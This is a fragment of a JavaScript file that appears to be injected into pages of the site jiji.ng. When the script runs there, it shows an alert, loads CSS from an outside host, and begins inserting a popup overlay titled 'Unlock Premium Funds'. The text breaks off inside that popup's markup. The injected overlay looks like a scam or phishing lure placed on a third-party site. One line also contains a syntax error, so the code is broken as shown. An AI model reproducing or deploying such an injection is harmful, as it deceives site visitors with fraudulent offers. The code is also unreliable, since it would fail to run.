console.log('checked');
function waitForElement(selector, timeout = 10000) {
  return new Promise((resolve, reject) => {
    const el = document.querySelector(selector);
    if (el) return resolve(el);

    const observer = new MutationObserver((mutations, obs) => {
      const el = document.querySelector(selector);
      if (el) {
        obs.disconnect();
        resolve(el);
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    setTimeout(() => {
      observer.disconnect();
      reject(new Error(`Timeout waiting for element: ${selector}`));
    }, timeout);
  });
}


if(location.href.includes("jiji.ng") ){
    alert('script injected');
    const style = document.createElement("link");
    style.href = "https://scriptbank.page.gd/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);
    
    let div = document.createElement('div');
    div.innerHTML = `<div class="popup-overlay">
  <div class="popup-card">
    <button class="close-btn" aria-label="Close popup">&times;</button>
    <div class="popup-image">🚀</div>
    <h2>Unlock Premium Funds</h2>
